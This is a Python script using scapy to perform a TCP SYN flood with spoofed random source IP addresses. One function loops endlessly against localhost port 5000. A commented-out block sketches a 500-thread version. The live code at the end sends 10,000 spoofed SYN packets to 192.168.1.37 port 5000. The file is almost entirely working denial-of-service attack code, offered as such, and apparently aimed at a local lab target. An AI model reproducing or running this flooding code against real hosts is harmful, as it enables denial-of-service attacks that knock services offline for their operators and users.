import random
from scapy.all import *

def attack():
    while(1):
        IP_packet = scapy.all.IP()
        IP_packet.dst = "127.0.0.1"
        IP_packet.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254),
                                            random.randint(1, 254), random.randint(1, 254))

        TCP_packet = scapy.all.TCP()
        TCP_packet.sport = random.randint(10000, 65535)
        TCP_packet.dport = 5000
        TCP_packet.flags = 'S'

        try:
            scapy.all.send(IP_packet / TCP_packet, verbose=0)
            print("Packet Sent")
        except:
            print("Packet Failed")
            exit()
        # a = str(random.randint(1,254))
        # b = str(random.randint(1,254))
        # c = str(random.randint(1,254))
        # d = str(random.randint(1,254))
        # dot = "."
        # global source_port, target_IP, i
        # Source_ip = a + dot + b + dot + c + dot + d
        # IP1 = IP(src = target_IP, dst = target_IP)
        # TCP1 = TCP(sport = source_port, dport = 80)
        # pkt = IP1 / TCP1
        # packet = IP(src=Source_ip, dst=target_IP)/TCP(sport = source_port,dport=80)/\
        #     b"GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n"
        # try:
        #     send(pkt,inter = .001)
        #     print ("packet sent ", i)
        #     i = i + 1
        # except: 
        #     print("Packet not sent")
        
# target_IP = "192.168.1.37"
# source_port = 5000
# i = 1
# # attack()
# try:
#   for _ in range(500):
#     thread = threading.Thread(target=attack)
#     thread.start()
# except (KeyboardInterrupt, SystemExit):
#   print ('\n! Received keyboard interrupt, quitting threads.\n')


from scapy.all import *

# IP address of the target server
target_ip = "192.168.1.37"

# Number of packets to send
num_packets = 10000

# Loop through and send packets
for i in range(num_packets):
    # Create an IP packet with a random source IP address
    packets = IP(src=RandIP(), dst=target_ip)/TCP(sport = 80, dport=5000, flags="S")
    
    # Send the packet
    send(packets)
    
    # Print progress
    print(f"Sent packet {i+1} to {target_ip}")
